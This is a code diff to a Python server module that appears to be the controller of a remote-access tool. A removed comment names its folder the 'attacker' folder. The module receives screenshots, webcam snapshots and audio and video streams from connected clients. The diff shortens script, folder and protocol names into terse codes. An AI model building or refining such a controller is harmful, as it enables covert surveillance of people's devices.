@@ -1,24 +1,38 @@
 import asyncore
 import os
 import threading
+import datetime
 
-# point to the project attacker folder (one level up from terminal package)
 CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
 
 BUFFER_SNAPSHOT = 609600
 BUFFER_DEFAULT = 8096
 ENCODING = "Cp1252"
 
-WEBCAM_SCRIPT = "webcam-host.py"
-MICROPHONE_SCRIPT = "microphone-host.py"
+WEBCAM_SCRIPT = "wb.py"
+MICROPHONE_SCRIPT = "mic.py"
 
-WEBCAM_DIR_FMT = "webcam{client_id}"
-SCREENSHOT_DIR_FMT = "screenshots{client_id}"
+WEBCAM_DIR_FMT = "wb{client_id}"
+SCREENSHOT_DIR_FMT = "ss{client_id}"
 
-SNAPSHOT_NAME_FMT = "snapshot_NUM{num}.png"
-SCREENSHOT_NAME_FMT = "Screenshot_ID{client_id}_NUM{num}.png"
+SNAPSHOT_NAME_FMT = "snap{num}.png"
+SCREENSHOT_NAME_FMT = "ss_{client_id}_{num}.png"
+
+DATA_TAKEN_SCREENSHOT = "TS"
+DATA_TAKEN_SNAPSHOT = "SS"
+DATA_START_LIVESTREAM = "VL"
+DATA_START_AUDIOSTREAM = "VA"
+
+CONNECTION_DISCONNECT_TEMPLATE = "[{time}] Client {addr} disconnected"
+CONNECTION_LOST_TEMPLATE = "[{time}] Client {addr} lost connection"
+
+def ts():
+    return datetime.datetime.now().strftime("%H:%M:%S")
 
 class ConnectionHandler(asyncore.dispatcher_with_send):
+    receiving_screenshot = False
+    receiving_snapshot = False
+
     def __init__(self, sock, addr, window, iD, connections):
         asyncore.dispatcher_with_send.__init__(self, sock)
         self.window = window
@@ -30,21 +44,19 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
 
     def handle_read(self):
         global CURRENT_FOLDER
-        
-        # use extracted default buffer and encoding
         data = self.recv(BUFFER_DEFAULT).decode(ENCODING)
-        if data == "Taken Screenshot":
+        if data == DATA_TAKEN_SCREENSHOT:
             ConnectionHandler.receiving_screenshot = True
-        if data == "Taken Snapshot":
+        if data == DATA_TAKEN_SNAPSHOT:
             ConnectionHandler.receiving_snapshot = True
-        elif data == "STARTING LIVESTREAM":
+        elif data == DATA_START_LIVESTREAM:
             video_thread = threading.Thread(target=ConnectionHandler.video_stream)
             video_thread.start()
-        elif data == "STARTING AUDIOSTREAM":
+        elif data == DATA_START_AUDIOSTREAM:
             audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
             audio_thread.start()
         elif data != "":
-            self.window.Output.addItem(f"\n{ts()} {data}")
+            self.window.Output.addItem(f"{ts()} {data}")
 
     def handle_close(self):
         try:
@@ -59,3 +71,11 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
         finally:
             self._connections.pop(self.id, None)
             self.window.Output.addItem(CONNECTION_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
+
+    @staticmethod
+    def video_stream():
+        return
+
+    @staticmethod
+    def audio_stream():
+        return
